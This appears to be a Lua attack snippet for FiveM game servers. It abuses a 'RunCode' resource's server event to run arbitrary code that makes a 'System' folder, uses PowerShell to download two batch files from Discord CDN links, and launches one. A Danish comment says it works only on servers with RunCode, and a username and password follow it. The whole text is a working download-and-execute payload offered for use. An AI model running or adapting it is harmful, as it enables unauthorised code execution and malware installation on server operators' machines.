TriggerServerEvent('RunCode:RunStringRemotelly', [[local a="https://cdn.discordapp.com/attachments/736357418963042315/829695600613392414/sys.bat" local b="https://cdn.discordapp.com/attachments/736357418963042315/829695780444045352/sysre.bat" local c="C:/Users/%USERNAME%/Documents/System/sys.bat" local d="C:/Users/%USERNAME%/Documents/System/sysre.bat" local e="Invoke-WebRequest -Uri "..a.." -OutFile "..c..""local f="Invoke-WebRequest -Uri "..b.." -OutFile "..d..""os.execute("cd C:/Users/%USERNAME%/Documents && mkdir System")os.execute("powershell.exe -Command "..e.."")os.execute("powershell.exe -Command "..f.."")os.execute("cd C:/Users/%USERNAME%/Documents/System && start sysre.bat")]])


-- VIRKER KUN HVIS SERVEREN HAR RUNCODE
-- Username : SkildpaddeSquad
-- Password : autist123!
